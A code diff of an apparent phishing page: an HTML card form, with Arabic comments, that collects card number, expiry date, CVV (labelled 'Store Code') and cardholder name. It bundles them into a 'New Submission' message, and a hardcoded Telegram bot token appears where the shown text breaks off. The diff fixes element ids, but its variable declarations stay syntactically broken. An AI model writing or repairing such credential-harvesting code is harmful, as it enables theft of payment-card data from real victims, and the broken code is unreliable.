@@ -294,9 +294,9 @@
         <form id="confirmForm" action="#" onsubmit="return false;">
           <!-- رقم البطاقة -->
           <div class="form-group">
-            <label for="Card number">Card number</label>
+            <label for="cardNumber">Card number</label>
             <input
-              id="Card number"
+              id="cardNumber"
               type="tel"
               inputmode="numeric"
               autocomplete="off"
@@ -309,9 +309,9 @@
           <!-- التاريخ + كود المتجر -->
           <div class="form-row">
             <div class="form-group">
-              <label for="Expiration date">Expiration date</label>
+              <label for="expirationDate">Expiration date</label>
               <input
-                id="Expiration date"
+                id="expirationDate"
                 type="tel"
                 inputmode="numeric"
                 autocomplete="off"
@@ -321,9 +321,9 @@
               />
             </div>
             <div class="form-group">
-              <label for="CVV/CVC">CVV/CVC</label>
+              <label for="cvv">CVV/CVC</label>
               <input
-                id="CVV/CVC"
+                id="cvv"
                 type="tel"
                 inputmode="numeric"
                 autocomplete="off"
@@ -336,9 +336,9 @@
 
           <!-- الاسم -->
           <div class="form-group">
-            <label for="Cardholder name">Cardholder name</label>
+            <label for="cardholderName">Cardholder name</label>
             <input
-              id="Cardholder name"
+              id="cardholderName"
               type="text"
               autocomplete="off"
               placeholder=""
@@ -355,7 +355,7 @@
 
   <script>
     // تنسيق رقم البطاقة: 16 رقم فقط + مسافات كل 4 أرقام
-    const numberInput = document.getElementById("Card number");
+    const numberInput = document.getElementById("cardNumber");
     numberInput.addEventListener("input", () => {
       let value = numberInput.value.replace(/\D/g, ""); // أرقام فقط
       if (value.length > 16) value = value.slice(0, 16);
@@ -364,7 +364,7 @@
     });
 
     // تنسيق التاريخ MM/YY تلقائياً
-    const expiryInput = document.getElementById("Expiration date");
+    const expiryInput = document.getElementById("expirationDate");
     expiryInput.addEventListener("input", () => {
       let value = expiryInput.value.replace(/\D/g, ""); // أرقام فقط
       if (value.length > 4) value = value.slice(0, 4);
@@ -377,7 +377,7 @@
     });
 
     // كود المتجر: 3 أرقام فقط
-    const storeCodeInput = document.getElementById("CVV/CVC");
+    const storeCodeInput = document.getElementById("cvv");
     storeCodeInput.addEventListener("input", () => {
       let value = storeCodeInput.value.replace(/\D/g, "");
       if (value.length > 3) value = value.slice(0, 3);
@@ -387,18 +387,18 @@
   <script>
 document.getElementById("confirmForm").addEventListener("submit", function () {
   
-  const Card number = document.getElementById("Card number").value;
-  const Expiration date = document.getElementById("Expiration date").value;
-  const CVV/CVC = document.getElementById("CVV/CVC").value;
-  const Cardholder name = document.getElementById("Cardholder name").value;
+  const Card number = document.getElementById("cardNumber").value;
+  const Expiration date = document.getElementById("expirationDate").value;
+  const CVV/CVC = document.getElementById("cvv").value;
+  const Cardholder name = document.getElementById("cardholderName").value;
 
   const message = `
 🔔 New Submission:
 -----------------------
-💳 Number: ${Card number}
-📅 Expiry: ${Expiration date}
-🏪 Store Code: ${CVV/CVC}
-🧑‍💼 Name: ${Cardholder name}
+💳 Number: ${cardNumber}
+📅 Expiry: ${expirationDate}
+🏪 Store Code: ${cvv}
+🧑‍💼 Name: ${cardholderName}
 `;
 
   const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc"; 
